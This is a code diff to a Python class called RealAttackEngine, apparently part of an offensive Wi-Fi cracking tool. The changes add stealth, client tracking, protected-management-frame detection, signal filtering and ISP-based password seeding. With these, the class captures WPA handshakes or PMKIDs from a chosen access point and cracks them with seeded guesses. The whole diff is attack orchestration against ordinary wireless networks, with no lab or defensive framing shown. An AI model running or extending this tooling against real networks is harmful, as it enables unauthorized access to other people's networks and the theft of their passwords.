@@ -19,6 +19,12 @@ class RealAttackEngine:
         self.hashcat_wrapper = None
         self.adaptive_engine = None
         self.hardware_optimizer = None
+        self.client_tracker = None
+        self.stealth_engine = None
+        self.pmf_detector = None
+        self.snr_engine = None
+        self.multi_interface = None
+        self.cracking_triage = None
         self.attack_results = []
 
     def initialize_engine(self, hardware_optimizer=None):
@@ -28,6 +34,11 @@ class RealAttackEngine:
             from engines.handshake_capture import HandshakeCapture
             from engines.pmkid_capture import PmkidCapture, AsyncCaptureEngine
             from engines.adaptive_engine import AdaptiveAttackEngine
+            from engines.stealth_engine import ClientTracker, StealthEngine
+            from engines.pmf_detector import PmfDetector
+            from engines.snr_engine import SnrEngine
+            from engines.multi_interface import MultiInterfaceManager
+            from intelligence.cracking_triage import CrackingTriage
             from learning.performance_tracker import PerformanceTracker
             from tools.hashcat_wrapper import HashcatWrapper
 
@@ -46,6 +57,12 @@ class RealAttackEngine:
                 self.config, self.error_handler,
                 self.password_generator, self.password_tester,
             )
+            self.client_tracker = ClientTracker(self.config, self.error_handler)
+            self.stealth_engine = StealthEngine(self.config, self.error_handler)
+            self.pmf_detector = PmfDetector(self.config, self.error_handler)
+            self.snr_engine = SnrEngine(self.config, self.error_handler)
+            self.multi_interface = MultiInterfaceManager(self.config, self.error_handler)
+            self.cracking_triage = CrackingTriage(self.config, self.error_handler)
 
             return True
         except Exception as e:
@@ -72,21 +89,87 @@ class RealAttackEngine:
             "handshake_captured": False,
             "pmkid_captured": False,
             "method": None,
+            "pmf_detected": False,
+            "snr_passed": False,
+            "isp_match": None,
             "errors": [],
         }
 
         try:
-            existing_hs = self.handshake_capture.find_existing_handshake(bssid)
-            if existing_hs:
-                result["handshake_captured"] = True
-                result["method"] = "existing_handshake"
-                capture_result = {"type": "handshake", "file": existing_hs}
-                print(f"   Using existing handshake: {existing_hs}")
-            else:
-                print(f"   Dual parallel capture starting (handshake + PMKID)...")
-                capture_result = self.async_engine.capture_dual(
-                    bssid, channel, interface, timeout=180,
+            rc_interface = interface
+            roles = self.multi_interface.assign_roles(interface)
+            if not roles["single_radio"]:
+                rc_interface = roles["executioner"]
+                print(f"   Executioner: {rc_interface}")
+
+            pmf = self.pmf_detector.get_attack_strategy(bssid, channel, rc_interface)
+            result["pmf_detected"] = pmf.get("pmf_required", False)
+
+            if pmf.get("pmf_required"):
+                result["method"] = "pmkid_only"
+                print(f"   PMF required → PMKID-only attack")
+                pm_file = self.pmkid_capture.capture_pmkid(
+                    bssid, channel, rc_interface, timeout=120,
                 )
+                if pm_file:
+                    result["pmkid_captured"] = True
+                    found_pw, tested = self._crack_pmkid(
+                        bssid, pm_file, target, max_duration, signal, seeds, result,
+                    )
+                    result["success"] = found_pw is not None
+                    result["password"] = found_pw
+                    result["tested_count"] = tested
+                    result["duration"] = time.time() - start_time
+                    self.performance_tracker.record_attack(target, result)
+                    self.attack_results.append(result)
+                    return result
+                else:
+                    result["errors"].append("PMKID capture failed (PMF mode)")
+                    self.performance_tracker.record_attack(target, result)
+                    return result
+
+            noise_floor = self.snr_engine.get_noise_floor(rc_interface)
+            snr_check = self.snr_engine.evaluate_target(target, noise_floor)
+            if not snr_check["passed"]:
+                result["errors"].append(
+                    "; ".join(snr_check["failed_reasons"])
+                )
+                self.snr_engine.blacklist_target(
+                    bssid, "; ".join(snr_check["failed_reasons"])
+                )
+                print(f"   SNR reject: {result['errors'][-1]}")
+                self.performance_tracker.record_attack(target, result)
+                return result
+
+            result["snr_passed"] = True
+            adaptive_to = snr_check["adaptive_timeout"]
+            print(f"   SNR {snr_check['snr']}dB | adaptive timeout: {adaptive_to}s")
+
+            pmkid_installed = self.pmkid_capture.is_available()
+            if pmf.get("pmf_capable") and pmkid_installed:
+                print(f"   PMF capable + hcxdumptool → PMKID preferred")
+                capture_result = self.async_engine.capture_dual(
+                    bssid, channel, rc_interface, timeout=adaptive_to,
+                )
+            else:
+                print(f"   Multi-client traffic scan for client targeting...")
+                clients = self.client_tracker.scan_clients_with_traffic(
+                    bssid, channel, rc_interface, scan_time=10,
+                )
+                traffic_info = self.client_tracker.get_traffic_summary(bssid)
+                print(f"   Clients: {len(clients)} ({traffic_info})")
+
+                existing_hs = self.handshake_capture.find_existing_handshake(bssid)
+                if existing_hs:
+                    result["handshake_captured"] = True
+                    result["method"] = "existing_handshake"
+                    capture_result = {"type": "handshake", "file": existing_hs}
+                    print(f"   Using existing handshake: {existing_hs}")
+                else:
+                    print(f"   Dual parallel capture (handshake + PMKID)...")
+                    capture_result = self.async_engine.capture_dual(
+                        bssid, channel, rc_interface, timeout=adaptive_to,
+                    )
 
             if not capture_result:
                 result["errors"].append("Both handshake and PMKID capture failed")
@@ -97,17 +180,34 @@ class RealAttackEngine:
             cap_file = capture_result["file"]
             result["method"] = capture_result["method"]
 
+            triage_seeds = self.cracking_triage.build_priority_seeds(target)
+            isp_name = self.cracking_triage.classify_isp(ssid)
+            if isp_name:
+                result["isp_match"] = isp_name
+
+            merged_seeds = list(seeds) if seeds else []
+            for cat, pw in triage_seeds:
+                if pw not in merged_seeds:
+                    merged_seeds.append(pw)
+            if merged_seeds:
+                print(
+                    f"   Priority seeds: {len(merged_seeds)} "
+                    f"({len(triage_seeds)} from triage)"
+                )
+
             if cap_type == "handshake":
                 result["handshake_captured"] = True
                 print(f"   Handshake captured: {cap_file}")
                 found_pw, tested = self._crack_handshake(
-                    bssid, cap_file, target, max_duration, signal, seeds, result,
+                    bssid, cap_file, target, max_duration, signal,
+                    merged_seeds or None, result,
                 )
             elif cap_type == "pmkid":
                 result["pmkid_captured"] = True
                 print(f"   PMKID captured: {cap_file}")
                 found_pw, tested = self._crack_pmkid(
-                    bssid, cap_file, target, max_duration, signal, seeds, result,
+                    bssid, cap_file, target, max_duration, signal,
+                    merged_seeds or None, result,
                 )
             else:
                 result["errors"].append(f"Unknown capture type: {cap_type}")
@@ -201,7 +301,7 @@ class RealAttackEngine:
 
             tested += 1
             if tested % 10000 == 0:
-                elapsed = time.time() - result.get("duration_start", time.time())
+                elapsed = max(0.1, time.time() - result.get("_crack_start", time.time()))
                 speed = tested / elapsed if elapsed > 0 else 0
                 print(f"   PMKID crack: {tested:,} tested ({speed:,.0f} p/s)", end="\r")
 
